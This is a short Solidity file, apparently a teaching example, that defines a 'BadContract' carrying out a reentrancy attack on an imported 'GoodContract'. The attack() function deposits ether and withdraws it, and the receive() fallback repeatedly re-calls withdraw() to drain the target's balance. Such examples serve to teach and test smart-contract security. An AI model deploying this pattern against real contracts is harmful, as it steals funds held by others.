// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "./GoodContract.sol";

contract BadContract{
    GoodContract public goodContract;
    constructor(address _goodContract){
        goodContract= GoodContract(_goodContract);
    }

    receive() external payable {
        if(address(goodContract).balance>0){
            goodContract.withdraw();
        }
    }

    function attack() public payable {
        goodContract.addBalance{value:msg.value}();
        goodContract.withdraw();
    }
}